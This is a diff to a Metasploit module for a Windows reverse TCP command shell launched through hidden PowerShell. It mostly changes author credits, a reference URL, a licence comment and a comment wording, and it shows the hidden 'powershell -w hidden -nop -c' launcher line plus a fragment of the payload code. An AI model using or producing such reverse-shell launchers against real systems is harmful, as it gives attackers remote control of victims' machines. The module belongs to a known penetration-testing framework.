@@ -17,7 +17,16 @@ module Metasploit3
     super(merge_info(info,
       'Name'          => 'Windows Command Shell, Reverse TCP (via Powershell)',
       'Description'   => 'Connect back and create a command shell via Powershell',
-      'Author'        => ['Ben Campbell', 'Dave Kennedy'],
+      'Author'        =>
+        [
+          'Dave Kennedy', # Original payload from trustedsec on SET
+          'Ben Campbell' # Metasploit module
+        ],
+      'References'    =>
+        [
+          'URL' => 'https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/powershell/reverse.powershell',
+        ],
+      # The powershell code is from SET, copyrighted by TrustedSEC, LLC and BSD licensed -- see https://github.com/trustedsec/social-engineer-toolkit/blob/master/readme/LICENSE
       'License'       => MSF_LICENSE,
       'Platform'      => 'win',
       'Arch'          => ARCH_CMD,
@@ -34,7 +43,7 @@ module Metasploit3
   end
 
   #
-  # Constructs the payload
+  # Constru the payload
   #
   def generate
     return super + command_string
@@ -85,7 +94,7 @@ module Metasploit3
               "}"\
             "}else{RSC}};"\
 
-    return "powershell -w hidden -nop -c #{powershell}"
+    "powershell -w hidden -nop -c #{powershell}"
   end
 
 end
